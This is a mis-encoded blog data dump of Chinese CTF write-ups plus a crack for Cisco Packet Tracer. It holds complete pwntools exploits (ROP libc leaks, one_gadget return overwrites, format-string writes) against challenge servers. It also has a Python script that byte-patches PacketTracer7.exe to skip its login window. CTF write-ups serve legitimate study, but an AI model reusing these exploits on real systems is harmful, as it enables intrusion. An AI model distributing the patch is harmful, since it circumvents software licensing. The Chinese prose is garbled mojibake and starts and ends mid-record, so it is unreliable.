-aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192 #!/bin/bash KEY=`cat AE5` AES=\"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192\" for mode in $AES do openssl enc -d -in fil.enc -out ./tmp3/fil\"$mode\".dec -k $KEY $mode done sudo chmod +x ./1.sh sudo sh 1.sh ICS_11ç¨‹åºä¸Šæ¥å°±å‘Šè¯‰ä¸€ä¸‹flagçš„æ ¼å¼ï¼Œå…¶ä¸­å­—ç¬¦çš„å†…å®¹æ˜¯20ä½ã€‚å‘ä¸‹èµ°ï¼Œä¹Ÿä¼šå‘ç°æœ‰20çš„ç›¸å…³åˆ¤æ–­ã€‚å…¶ä¸Šæ–¹æœ‰ä¸ªå¤§å°åˆ¤æ–­å¤§äº10å°±é€€å‡ºäº†ï¼Œä½†æ˜¯flagæ˜¯20ä½çš„ï¼Œæ˜æ˜¾éœ€è¦patchä¸€ä¸‹ï¼š ç„¶åå¾€ä¸‹åˆ†æï¼Œå‘ç°ä½ è¾“å…¥çš„ä¸œè¥¿ä¼šè·Ÿ12ä½çš„nemo_pwned_nè¿›è¡Œå…ˆæ¯”è¾ƒä¸€ä¸‹ï¼Œæ¥ç€: if ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 ) æ˜æ˜¾è¿™æ˜¯éƒ½éœ€è¦è¿›è¡Œæ»¡è¶³çš„ã€‚ç„¶åæ±‚è§£ä¸€ä¸‹ï¼š In [6]: hex(926180401) Out[6]: '0x37346431' (v17) In [7]: hex(1915971957) Out[7]: '0x72336975'. (v18) è¿™æ ·å¤§æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œå…¶å®ä¹Ÿæ˜¯åˆ¤æ–­å­—ç¬¦çš„ï¼Œè½¬ç ä¸€ä¸‹ï¼š 0x37346431:74d1 0x72336975 :r3iuä½†æ˜¯å› ä¸ºåœ¨å†…å­˜ä¸­ï¼Œå…¶æ˜¯å°ç«¯åºçš„ï¼Œéœ€è¦åè½¬ä¸€ä¸‹ã€‚çŒœæµ‹flagå°±æ˜¯nemo_pwned_n1d47ui3rã€‚å…¶é•¿åº¦æ­£å¥½å°±æ˜¯20ä½ã€‚ ç»è¿‡éªŒè¯çš„ç¡®æ˜¯çš„ã€‚ ICS_13ååˆ†ç®€å•ï¼Œè‡ªå·±è¾“å…¥çš„ä¸œè¥¿å‡å»0x14ï¼Œå’Œ10445678951è¿›è¡Œä¸€ä¸ªä¸ªå­—èŠ‚çš„æ¯”è¾ƒï¼Œç›¸ç­‰å°±okã€‚ key = '10445678951' key = [ord(c) for c in key] flag = '' for i in key : flag += chr(i+0x14) print(flag) ICS_2å…ˆè„±å£³ï¼Œespå®šå¾‹è„±å£³ã€‚ä¹Ÿå¯ä»¥ç”¨ä¸‡èƒ½è„±å£³æœºè¿›è¡Œè„±ã€‚ç”±äºç»™äº†æç¤ºï¼Œæ˜¯éœ€è¦æ‰¾ä¸€ä¸ªipã€‚å¾ˆç®€å•çš„æ€è·¯å°±æ˜¯ç›´æ¥æ‰¾å¯ç–‘ipã€‚ x32dbgç›´æ¥æ–­åœ¨è¿™é‡Œï¼Œå‘ä¸‹è·Ÿã€‚ å‘ç°å¯ç–‘ipï¼Œæäº¤å°±å¯¹äº†ã€‚ ICS_14ç¨‹åºå°±æ˜¯å¾ˆç®€å•æ‰¾åˆ°æ³¨å†Œç ã€‚é‚®ç®±å¯ä»¥ä¹±è¾“å…¥ï¼Œä½†æ˜¯è¦ä¿è¯@ + xx + . + xx è¿™é‡Œæœ‰å‡½æ•°è¿›è¡Œæ§åˆ¶åˆ¤æ–­ã€‚å¦‚æœä¸å¯¹å°±ä¼šè¯´ï¼Œé‚®ç®±ä¸åˆæ³•ã€‚æ¥ç€çœ‹æµç¨‹ï¼š è¿™å—åœ¨åˆ¤æ–­ä¸€å †ä¸œè¥¿ï¼Œæ¨æµ‹å°±æ˜¯æ³¨å†Œç ã€‚å¾€ä¸Šä¸€çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸€æ¡ã€‚ æ˜æ˜¾æ˜¯idaæ— æ³•è¯†åˆ«ï¼Œå…¶æ˜¯è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ ç„¶åå°±æ˜¯ä¸€ä¸ªä¸ªè½¬å­—ç¬¦ä¸²ï¼Œä»¥v12-v27æ•´åˆä¸€ä¸‹,BZ9dmq4c8g9G7bAYå‡ºæ¥è¿™ä¸ªã€‚å¹¶ä¸”å¯ä»¥çœ‹åˆ°åˆ¤æ–­å°±æ˜¯16ä½ã€‚ç„¶åè¿›è¡Œè¾“å…¥åˆ¤æ–­:å°±å¾ˆç®€å•æˆåŠŸæ‹¿åˆ°ã€‚","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"misc","slug":"misc","permalink":"http://chumen77.xyz/tags/misc/"}]},{"title":"å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£","slug":"å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£","date":"2020-09-07T09:11:40.744Z","updated":"2020-09-12T09:14:20.389Z","comments":true,"path":"2020/09/07/å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£/","link":"","permalink":"http://chumen77.xyz/2020/09/07/å®æˆ˜å»é™¤packet tracerç™»é™†çª—å£/","excerpt":"","text":"å®æˆ˜å»é™¤æ€ç§‘packet tracerç™»é™†çª—å£èƒŒæ™¯ä¸“ä¸šè¯¾å¼€è®¾äº†è·¯ç”±äº¤æ¢è¿™é—¨è¯¾ï¼Œå…¶ä¸­è¦ç»å¸¸ä½¿ç”¨packet tracerè¿™ä¸ªè½¯ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰æ³¨å†Œçš„è¯ï¼Œæ¯æ¬¡ç™»é™†éƒ½éœ€è¦ç­‰å¾…15sï¼Œå°±å°è¯•ç ´è§£ä¸€ä¸‹ã€‚ ç›®æ ‡ç ´é™¤ç­‰å¾…çš„15sï¼Œæœ€å¥½ç›´æ¥å»é™¤æ‰ç™»é™†çª—å£ã€‚ä½†æ˜¯è€å¸ˆä¸Šè¯¾ç»™æˆ‘ä»¬æ¼”ç¤ºè¿‡ï¼Œæœ‰ä¸ªå¾çˆ±ç ´è§£çš„æ’ä»¶æ˜¯ç›´æ¥ç ´è§£æ‰ç™»é™†çª—å£çš„ï¼Œå°±ç›´æ¥å¥”ç€è¿™ä¸ªç›®æ ‡å»ã€‚ å·¥å…· win7 æ¨¡æ‹Ÿå™¨ packet tracer 7.11 x64dbg ç ´è§£è¿‡ç¨‹è®°å½•å¯»æ‰¾çªç ´å£ï¿¼åœ¨å¼¹å‡ºç™»é™†ç•Œé¢æ—¶ï¼Œæœ€ä¸Šæ–¹ä¼šæœ‰ netacad.com Loginçš„å­—çœ¼ï¼Œå…ˆå°±é€‰æ‹©è¿™é‡Œä½œä¸ºå…³é”®å­—ç¬¦ä¸²ã€‚ï¿¼åœ¨è¿™ä¸ªexeçš„ç¨‹åºä¸‹æœç´¢å­—ç¬¦ä¸²ã€‚ç«¯å£å¯ç–‘å­—ç¬¦ä¸²å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ã€‚ ç„¶åå¼€å§‹f9ä¸€ç›´è¿è¡Œï¼Œåœ¨è¿™ä¸ªnetacad.com Loginï¼Œè¿è¡Œå…¶åçš„è½¯ä»¶ä¼šå‘ç°ï¼Œçš„ç¡®å¼€å¯äº†ç™»é™†çš„çª—å£ã€‚è¿™æ ·å°±å¯ä»¥ç¡®å®šï¼Œå…³é”®å¤„å°±åœ¨è¿™é‡Œã€‚å‘ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ï¼Œä¸€äº›ç™»é™†å¤±è´¥çš„å­—ç¬¦ä¸²ï¼Œé‚£å°±æ— ç–‘æ˜¯è¿™ä¸€å—çš„å‡½æ•°æ§åˆ¶ç€è¿™ä¸ªç™»é™†çª—å£ã€‚ å‘ä¸Šçœ‹å¯ä»¥çœ‹åˆ°ï¼Œæœ‰å‡ ä¸ªå°è·³è½¬ï¼Œå’Œä¸€ä¸ªå¤§è·³è½¬ï¼Œç„¶åè¿½è¿‡å»å¯ä»¥å‘ç°ï¼Œæ˜¯å¯ä»¥ç»•è¿‡è¿™äº›å…³é”®å‡½æ•°çš„ã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œå°è¯•æ”¹æˆjmp æ— æ¡ä»¶è·³è½¬ä¸€ä¸‹è¯•ä¸€è¯•ã€‚ ç„¶åç›´æ¥è¿è¡Œä¸€ä¸‹ï¼Œç„¶åçš„ç¡®æ˜¯æˆåŠŸäº†ï¼Œå»æ‰äº†ç™»é™†æ¡†ã€‚ ç„¶åè¿›è¡Œä¿å­˜è¡¥ä¸ï¼Œæ›¿æ¢ä¸»ç¨‹åºå³å¯ã€‚ å°æ€»ç»“çš„ç¡®æ˜¯æ‰¾åˆ°äº†å…³é”®å¤„ï¼Œæ„Ÿè§‰æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œç”±äºå‰äººç»éªŒå°±æ˜¯ä»ç™»é™†ç•Œé¢ä¸‹æ‰‹çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç›´æ¥è·Ÿéšè¿™ä¸ªæ€è·¯æ“ä½œã€‚åœ¨å®Œå·¥ä»¥åï¼Œå°è¯•å»æä¸€ä¸‹15så“ªé‡Œçš„éªŒè¯ï¼Œæƒ³ç‚¹ä¸€ä¸‹ç›´æ¥å˜ä¸º0sï¼Œå¯ä»¥ç‚¹å‡»ç¡®è®¤ï¼Œå‘ç°æ˜¯çš„ç¡®éº»çƒ¦ä¹Ÿæ²¡æœ‰æˆåŠŸå°±æ”¾å¼ƒäº†ã€‚ åŠè‡ªåŠ¨åŒ–æ‰“è¡¥ä¸ä¸å¤ªä¼šå†™cï¼Œç”¨python å†™äº†æ‰“è¡¥ä¸çš„ç¨‹åºï¼Œç¡®ä¿æœ¬æœºæœ‰python2çš„è¿è¡Œç¯å¢ƒã€‚ç„¶åæŠŠè„šæœ¬æ”¾åœ¨å…¶å®‰è£…è·¯å¾„çš„binç›®å½•ä¸‹ï¼Œè¿è¡Œå³å¯ã€‚ ä¹Ÿå¯ä»¥æŠŠç¨‹åºæ‹–å‡ºæ¥ï¼Œæ‰“å®Œè¡¥ä¸åæ›¿æ¢åŸæ¥çš„ç¨‹åºå³å¯ã€‚ #!/usr/bin/env python2.7 import struct import os def WriteFile(): with open('PacketTracer7.exe','r') as f: dt = f.read() dt = dt[:0x17a5245]+'\\xe9\\xee\\x04\\x00\\x00\\x90'+dt[0x17a524b:] with open('PacketTracer7.exe', 'w') as f: f.write(dt) if __name__ == '__main__': WriteFile() é’ˆå¯¹çš„åªæ˜¯7.11ã€‚","categories":[],"tags":[{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"}]},{"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®","slug":"å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®","date":"2020-08-24T02:34:05.216Z","updated":"2020-09-23T12:02:35.653Z","comments":true,"path":"2020/08/24/å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®/","link":"","permalink":"http://chumen77.xyz/2020/08/24/å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®/","excerpt":"","text":"å¼ºç½‘æ¯2020 éƒ¨åˆ†é¢˜ç›®babymessageåˆ†æArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) åŸºæœ¬ä¿æŠ¤ä¸ç®—å¤šã€‚ æ˜¯ä¸€ä¸ªä¼ªå †é¢˜ã€‚ æ¼æ´ç‚¹åœ¨ leave_message(v1)å‡½æ•°è¿™é‡Œçš„v1ä¸Šæ¥å–å€¼å°±æ˜¯16 __int64 __fastcall leave_message(unsigned int a1) &#123; int v1; // ST14_4 __int64 v3; // [rsp+18h] [rbp-8h] puts(\"message: \"); v1 = read(0, &amp;v3, a1); strncpy(buf, (const char *)&amp;v3, v1); buf[v1] = 0; puts(\"done!\\n\"); return 0LL; &#125; è¿›å…¥ä»¥åå¯ä»¥å‘ç°ï¼Œv3æ˜¯åªæœ‰8å­—èŠ‚å¤§å°çš„ï¼Œå¯ä»¥æº¢å‡º8å­—èŠ‚ï¼Œå¯ä»¥è¦†ç›–åˆ°rbpã€‚ ç”¨é€”.text:0000000000400985 ; 22: if ( v1 &gt; 256 ) .text:0000000000400985 cmp [rbp+var_4], 100h .text:000000000040098C jle short loc_400995 .text:000000000040098E ; 23: v1 = 256; .text:000000000040098E mov [rbp+var_4], 100h .text:0000000000400995 ; 24: leave_message(v1); åœ¨è¿›å…¥leave_message(v1)å‰v1æœ‰ä¸€ä¸ªå¯¹äº0x100å¤§å°çš„åˆ¤æ–­ï¼Œè¦æ˜¯v1å¤§äº0x100å°±ç»™è®¾ç½®ä¸º0x100ã€‚è¿™å°±å¯ä»¥å®ç°æ ˆæº¢å‡ºï¼Œè¿›è¡Œropã€‚ æ€ä¹ˆæ§åˆ¶v1ï¼š signed int v1; // [rsp+Ch] [rbp-4h] å¯ä»¥æ˜æ˜¾çœ‹åˆ°v1åœ¨rbp-4çš„åœ°å€ï¼Œç„¶årbpï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæº¢å‡ºè¦†ç›–ï¼Œè¦†ç›–åˆ°åˆé€‚çš„åœ°æ–¹åï¼Œä¿éšœ-4åï¼Œæœ‰ä¸ªintå¤§å°çš„å¤§äºç­‰äº0x100çš„å€¼å³å¯ã€‚ è¿™ä¸ªåˆé€‚åœ°å€ï¼Œå¯ä»¥ä»leave_name() ä¸‹æ‰‹ï¼Œå› ä¸ºå…¶å¾€bssæ®µè¯»äº†å€¼ã€‚ byte_6010D0[(signed int)read(0, byte_6010D0, 4uLL)] = 0; æ”»å‡» æ„é€ ropé“¾ï¼Œæ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œè¿”å›startï¼Œè®©ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œæ¸…ç†æ ˆ å†æ¬¡åˆ©ç”¨ï¼Œæ§åˆ¶ret address ä¸ºone_gadget expfrom pwn import * import time local_file = './babymessage' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('123.56.170.202',21342) libc = elf.libc libc = ELF('./libc-2.27.so') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() pop_rdi = 0x0000000000400ac3 start = 0x04006E0 sla('choice','1') sa('name',p32(0xffff)) sla('choice','2') payload = p64(0x02000200) + p64(0x06010D0+4) sa('mes',payload) sla('choice','2') rop = flat([pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],start]) payload = p64(0x02000200) + p64(0x06010D0+4) payload +=rop sa('mes',payload) ru('done!') r(2) libc_base = uu64(r(6)) - libc.sym['__libc_start_main'] info_addr('libc_base',libc_base) sla('choice','1') sa('name',p32(0xffff)) sla('choice','2') # debug() payload = p64(0x02000200) + p64(0x06010D0+4) sa('mes',payload) rec = 0x10a45c + libc_base sla('choice','2') rop = p64(rec) payload = p64(0x02000200) + p64(0x06010D0+4) payload +=rop sa('mes',payload) itr() flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125; Siriåˆ†æä¿æŠ¤å…¨å¼€ã€‚æ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”å¯ä»¥æ— é™æ¬¡è§¦å‘ã€‚ æ¼æ´ç‚¹signed __int64 __fastcall sub_1212(const char *a1) &#123; char *v2; // [rsp+18h] [rbp-128h] char s; // [rsp+20h] [rbp-120h] unsigned __int64 v4; // [rsp+138h] [rbp-8h] v4 = __readfsqword(0x28u); v2 = strstr(a1, \"Remind me to \"); if ( !v2 ) return 0LL; memset(&amp;s, 0, 0x110uLL); sprintf(&amp;s, \"&gt;&gt;&gt; OK, I'll remind you to %s\", v2 + 13); printf(&amp;s); puts(&amp;::s); return 1LL; &#125; å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ä½ æ‰€è¾“å…¥çš„éƒ½ä¼šè¢«sprintfå¤„ç†ä»¥åç»™printfå‡½æ•°ã€‚ç”±äºå…¶æ˜¯%sæ¥å¤„ç†æ•°æ®ï¼Œè¿™å°±è®©ç›´æ¥åœ¨æ ˆä¸Šå†™åœ°å€ï¼Œç„¶åæ”»å‡»é€ æˆäº†éš¾åº¦ã€‚ä½†æ˜¯è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå…¶å®è¾“å…¥çš„ä¸œè¥¿è¿˜ä¼šä¿ç•™åœ¨æ ˆä¸Šï¼Œå› ä¸ºsprintfå¤„ç†æ•°æ®ä¹Ÿæ˜¯ä»æ ˆä¸Šæ‹¿çš„ï¼Œæ‰€ä»¥ä¼šè¢«ä¿ç•™çš„ã€‚ æ”»å‡» ç¬¬ä¸€æ¬¡è§¦å‘ï¼Œæ³„æ¼å‡ºlibcåœ°å€ï¼Œstackåœ°å€ã€‚ æ‰§è¡Œåˆ°printfå‡†å¤‡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œç”¨sprintfæ®‹ç•™æ ˆä¸Šçš„æ•°æ®ï¼ˆåœ¨0x100åï¼‰ï¼Œè¿™ä¸ªéœ€è¦ç²¾å¿ƒæ„é€ å¥½åï¼Œè¿›è¡Œæ”»å‡»ret addressã€‚éœ€è¦ä¸€æ¬¡æ€§æ”¹å¥½ã€‚ expfrom pwn import * import time local_file = './pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('123.56.170.202',12124) # libc = elf.libc libc = ELF('./libc.so.6') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): gdb.attach(io) pause() def start_attc(): sla('&gt;&gt;','Hey Siri!') r() a = 'Remind me to ' start_attc() payload = str(a) + '%83$p' + 'bbb' + '%7$p' # ru('&gt;&gt;&gt;') s(payload) ru('0x') libc_base = int(r(12),16) - 0x21b97 info_addr('libc_base',libc_base) ru('bbb0x') stack_base = int(r(12),16) - 0x150 info_addr('stack_base',stack_base) tag = stack_base + 0x148 start_attc() def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 27 fmtpayload = \"\" key = 0x4f365 + libc_base info_addr('key',key) for i in range(3): fmtpayload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,55+i) prev = (key &gt;&gt; i*16) &amp; 0xffff print(fmtpayload) payload = str(a) + fmtpayload payload +='aaa' + 'b' + p64(tag)[0:6] + '\\x00'*2 + p64(tag+2)[0:6] + '\\x00'*2 + p64(tag+4)[0:6] + '\\x00'*2 + p64(tag+6)[0:6] + '\\x00'*2 s(payload) itr() flag&#123;da8836b9e9df3db44fe4bd7f39d4f7ab&#125; water_reIdaåç¼–è¯‘åçš„ä»£ç æ¯”è¾ƒéš¾çœ‹ï¼Œå‘ç°é‡ç‚¹æ•°æ®é€ æˆäº†å›°éš¾ï¼Œå°±é‡‡å–åŠ¨æ€è°ƒè¯•ã€‚ åŸºæœ¬æµç¨‹å°±æ˜¯ï¼Œgetsä¸€æ®µä½ è¾“å…¥çš„flagï¼Œè¯»å…¥åç”¨sub_12f0_è¿›è¡Œå¤„ç†ï¼Œç„¶åç»™v10 v11 v12 v13 åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æ¯”ã€‚ sub_12F0_åŠ å¯†å‡½æ•°_BYTE *__fastcall sub_12F0(_BYTE *a1) &#123; _BYTE *result; // rax int v2; // esi __int64 v3; // r8 __int64 v4; // rdx __int64 v5; // rax int v6; // ecx char v7; // r8 char v8; // dl __asm &#123; endbr64 &#125; result = (_BYTE *)sub_1090(); if ( (signed int)result &lt;= 0 ) return result; v2 = (signed int)result; v3 = (unsigned int)((_DWORD)result - 1); v4 = 0LL; do &#123; a1[v4] = (a1[v4] ^ byte_4010[(unsigned int)v4 % 7]) + 65; v5 = v4++; &#125; while ( v3 != v5 ); v6 = 0; do &#123; v7 = a1[3]; result = a1 + 3; do &#123; v8 = *(result-- - 1); result[1] = v8; &#125; while ( a1 != result ); v6 += 4; *a1 = v7; a1 += 4; &#125; while ( v2 &gt; v6 ); return result; &#125; åŠ¨æ€è°ƒè¯•ï¼Œè¿›è¡Œèµ·æ¥å¾ˆå®¹æ˜“çœ‹æ‡‚ã€‚ä¸Šæ¥å°±æ˜¯ä¸€ä¸ªå¯¹è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªä¸byte_4010çš„å­—ç¬¦&#39;Q&#39;, &#39;W&#39;, &#39;B&#39;, &#39;l&#39;, &#39;o&#39;, &#39;g&#39;, &#39;s&#39; 7ç»„æ¥è¿›è¡Œä¸€ä¸ªå¼‚æˆ–å’Œ+65ã€‚ ç„¶åä¸‹é¢ï¼š while ( v3 != v5 ); v6 = 0; do &#123; v7 = a1[3]; result = a1 + 3; do &#123; v8 = *(result-- - 1); result[1] = v8; &#125; while ( a1 != result ); v6 += 4; *a1 = v7; a1 += 4; &#125; åªçœ‹ç€è®©äººå¤´å¤§ï¼Œè¾“å…¥flag{11111111111111111111111111111111111111111} åŠ¨æ€è°ƒè¯•ä¸€ä¸‹å‘ç°ï¼š åˆ†æè¿™2ç»„æ•°æ®å°±ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯¹4ä¸ªæ•°æ®ä¸ºä¸€ç»„è¿›è¡Œå¤„ç†ã€‚å¤„ç†åç»“æœå°±æ˜¯åŸæ¥çš„ï¼š v1 &gt; v2 &gt; v3 &gt; v4 å˜ä¸º v4 &gt; v1 &gt; v2 &gt; v3 è¿™æ ·çš„ç»“æœã€‚ ç„¶åå¤„ç†å®Œå°±ç»™v10 v11 v12 v13 åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ã€‚è¿™è‚¯å®šä¸ºä¸€ä¸²å¤„ç†è¿‡çš„å­—ç¬¦ä¸²ï¼Œidaä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œç›´æ¥æå–æœ‰ç‚¹å®³æ€•æå–é”™ï¼ŒåŠ¨è°ƒæ—¶æå–ä¸€ä¸‹å‡ºæ¥ï¼š tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49, 0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E, 0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69, 0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44] ä¹Ÿå°±æ˜¯è¿™ä¸€æ®µæ•°æ®ã€‚ expè‡ªå·±ç›´æ¥æ‰‹åŠ¨æ›¿æ¢çš„æ•°æ®ã€‚ tag1=[0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49, 0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E, 0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69, 0x79, 0x78, 0x4F, 0x5C, 0x50, 0x57, 0x5E, 0x65, 0x62, 0x44] tag2 = [0x78, 0x7C, 0x64,0x4C, 0x55, 0x77, 0x65,0x54, 0x49,0x76, 0x4E,0x5C, 0x43, 0x42, 0x4F,0x68, 0x71, 0x44, 0x4E,0x4C, 0x57, 0x7D, 0x49,0x66, 0x46, 0x5A, 0x43,0x6D, 0x69,0x79, 0x78, 0x74, 0x5C, 0x50, 0x57, 0x4F, 0x65, 0x62, 0x44,0x5E] qwkey = ['Q', 'W', 'B', 'l', 'o', 'g', 's'] flag = '' i = 0 j = 0 for i in range(len(tag2)): if j ==7: j = 0 flag += chr((tag2[i] - 65) ^ ord(qwkey[j % 7])) j += 1 print(str(flag)) ä¼°è®¡æ²¡æœ‰æå–å…¨ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“çŸ¥é“flagäº†ã€‚ flag&#123;QWB_water_problem_give_you_the_score&#125; Just_a_Galgameåˆ†æé¢˜ç›®æé†’äº†æ˜¯house of orangeï¼Œé‚£å°±æƒ³ç€è¿™æ ·åˆ©ç”¨å³å¯ã€‚ç°åœ¨house of orangeçš„æ€æƒ³ï¼Œç»ŸæŒ‡ä¸»è¦æ˜¯é’ˆå¯¹æ²¡æœ‰freeçš„å †é¢˜ï¼Œå…¶æ”¹top chunkï¼Œç„¶åç”³è¯·ä¸€ä¸ªå¤§ç‚¹çš„chunkï¼Œæ¥è¿›è¡Œè·å–ä¸€ä¸ªè¿›å…¥unsortbin çš„å †å—ã€‚æ²¡æœ‰å¦‚æœ€æ—©çš„å¾ˆç»å…¸çš„åˆ©ç”¨unsortbin attack å’Œ io ç»“åˆæ¥è·å–shellã€‚ é¢˜ç›®çš„case2 Invite her to go to a movie. ä¸­ï¼š printf(\"movie name &gt;&gt; \", &amp;buf); v4 = atoi((const char *)&amp;buf); read(0, (void *)(qword_404060[v4] + 0x60), 0x10uLL); ç”±äºå…¶æ˜¯åœ¨åŠ 0x60ä¹‹åè¯»å–ï¼Œä¸”åœ¨case 1 åªæ˜¯malloc(0x68)ï¼Œæ‰€ä»¥åœ¨æ­¤å¤„å¯ä»¥æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæ”¹å†™åˆ° top chunkã€‚ å¹¶ä¸”case3ï¼š puts(\"You are the apple of my eyes too!\"); qword_404098 = (__int64)malloc(0x1000uLL); ++v12; å¯ä»¥ç»™ä½ ç”³è¯·0x1000çš„å †å—ï¼Œè¿™å°±å¯ä»¥å®ç°äº†house of orangeã€‚ åœ¨case5ä¸­ï¼š puts(\"\\nHotaru: Won't you stay with me for a while? QAQ\\n\"); read(0, &amp;key, 8uLL); ä¼šç»™0x4040A0 è¯»ä¸€æ®µæ•°æ®ã€‚ æ˜¯ç´§æŒ¨ç€å †å—çš„ã€‚ç„¶è€Œåœ¨case2ä¸­åœ¨editæ—¶ä¹Ÿæ²¡æœ‰å¯¹å †å—åºå·çš„æ£€æŸ¥,è®©ä¸ªäººè¾“å…¥ä¸ª8 å³å¯å–åˆ°è¿™é‡Œï¼Œè¿›è¡Œç¼–è¾‘ã€‚ æ”»å‡»æ€è·¯ house of orangeæ¥è·å–ä¸€ä¸ªunsortbin ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä¼šåœ¨è¿™ä¸ªold top chunkä¸­ï¼Œåˆ‡å‡ºä¸€ä¸ªå †å—ï¼Œå…¶ä¸Šä¼šå­˜åœ¨libcçš„ç›¸å…³åœ°å€ showä¸€ä¸‹ï¼Œæ³„æ¼å‡ºlibc base leave __malloc_hook - 0x60çš„åœ°å€åœ¨key å¤„ï¼Œç„¶åè¿›è¡Œç¼–è¾‘è¿™é‡Œçš„æ•°æ®ã€‚ expfrom pwn import * import time local_file = './Just_a_Galgame' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27411) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data 